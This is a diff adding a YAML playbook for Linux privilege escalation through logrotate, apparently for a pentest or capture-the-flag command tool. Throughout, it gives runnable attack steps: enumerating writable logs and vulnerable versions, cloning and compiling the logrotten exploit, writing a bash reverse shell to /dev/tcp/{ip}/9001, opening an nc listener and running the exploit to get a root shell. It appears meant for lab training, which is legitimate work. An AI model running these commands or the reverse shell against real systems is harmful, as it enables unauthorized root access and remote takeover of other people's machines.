@@ -1,0 +1,184 @@
+name: Linux Privilege Escalation - Logrotate
+
+steps:
+
+# =========================================================
+# [1] ENUMERATION
+# =========================================================
+- title: Enumerate Logrotate
+  mode: enum
+  info: |
+    Identify logrotate configuration, writable logs, and vulnerable versions.
+
+  entries:
+
+    - cmd: "logrotate --version"
+      info: identify logrotate version
+
+    - cmd: "cat /etc/logrotate.conf"
+      info: inspect global logrotate config
+
+    - cmd: "ls -la /etc/logrotate.d/"
+      info: enumerate logrotate jobs
+
+    - cmd: "find /var/log -type f -writable 2>/dev/null"
+      info: identify writable log files
+
+    - cmd: "find / -type f -perm -o+w 2>/dev/null"
+      info: locate world writable files
+
+    - cmd: "grep 'create\\|compress' /etc/logrotate.conf | grep -v '#'"
+      info: identify logrotate mode
+
+    - cmd: "cat /var/lib/logrotate/status"
+      info: inspect rotation schedule
+
+  look_for:
+    - writable logs
+    - create option
+    - compress option
+    - vulnerable versions
+    - root-owned rotations
+
+  notes:
+    - vulnerable versions include 3.8.6, 3.11.0, 3.15.0, 3.18.0
+    - root-executed rotations are required
+    - writable logs are required
+
+# =========================================================
+# [2] IDENTIFY ROTATION TIMING
+# =========================================================
+- title: Identify Rotation Timing
+  mode: enum
+  info: |
+    Determine how often logrotate executes.
+
+  entries:
+
+    - cmd: "systemctl list-timers | grep logrotate"
+      info: identify logrotate timer
+
+    - cmd: "cat /etc/crontab"
+      info: inspect cron jobs
+
+    - cmd: "ls -la /etc/cron.daily/"
+      info: inspect daily cron jobs
+
+    - cmd: "pspy64 -pf -i 1000"
+      info: monitor logrotate execution
+
+  look_for:
+    - cron execution
+    - systemd timers
+    - frequent rotations
+
+  notes:
+    - pspy is extremely useful for timing attacks
+    - logrotate commonly runs via cron.daily or systemd timers
+
+# =========================================================
+# [3] PREPARE LOGROTTEN
+# =========================================================
+- title: Prepare Logrotten Exploit
+  mode: chain
+  info: |
+    Compile and prepare logrotten exploit.
+
+  entries:
+
+    - cmd: "git clone https://github.com/whotwagner/logrotten.git"
+      info: clone exploit
+
+    - cmd: "cd logrotten"
+      info: enter exploit directory
+
+    - cmd: "gcc logrotten.c -o logrotten"
+      info: compile exploit
+
+    - cmd: "ls -l logrotten"
+      info: verify binary compiled
+
+  notes:
+    - compile locally if gcc unavailable
+    - transfer binary if necessary
+
+# =========================================================
+# [4] CREATE PAYLOAD
+# =========================================================
+- title: Create Reverse Shell Payload
+  mode: chain
+  info: |
+    Build payload for root execution.
+
+  entries:
+
+    - cmd: "echo 'bash -i >& /dev/tcp/{ip}/9001 0>&1' > payload"
+      info: create reverse shell payload
+
+    - cmd: "chmod +x payload"
+      info: make payload executable
+
+    - cmd: "cat payload"
+      info: verify payload
+
+  payload: "bash -i >& /dev/tcp/{ip}/9001 0>&1"
+
+  notes:
+    - replace with your tun0 IP
+    - payload executes as root if exploit succeeds
+
+# =========================================================
+# [5] START LISTENER
+# =========================================================
+- title: Start Listener
+  mode: enum
+
+  entries:
+
+    - cmd: "nc -lvnp 9001"
+      info: wait for reverse shell
+
+# =========================================================
+# [6] EXECUTE EXPLOIT
+# =========================================================
+- title: Execute Logrotate Exploit
+  mode: chain
+  info: |
+    Trigger logrotten against writable log file.
+
+  entries:
+
+    - cmd: "./logrotten -p ./payload /tmp/tmp.log"
+      info: exploit writable log file
+
+    - cmd: "id"
+      info: verify root access
+
+    - cmd: "hostname"
+      info: identify target
+
+  look_for:
+    - incoming shell
+    - uid=0(root)
+
+  notes:
+    - target log must be writable
+    - logrotate must rotate file as root
+
+# =========================================================
+# [7] QUICK WIN CHECKLIST
+# =========================================================
+- title: Quick Win Checklist
+  mode: chain
+
+  entries:
+
+    - cmd: "Check logrotate version"
+    - cmd: "Find writable logs"
+    - cmd: "Check root-owned rotations"
+    - cmd: "Inspect logrotate.conf"
+    - cmd: "Identify create/compress mode"
+    - cmd: "Monitor with pspy"
+    - cmd: "Compile logrotten"
+    - cmd: "Create reverse shell payload"
+    - cmd: "Run exploit against writable log"
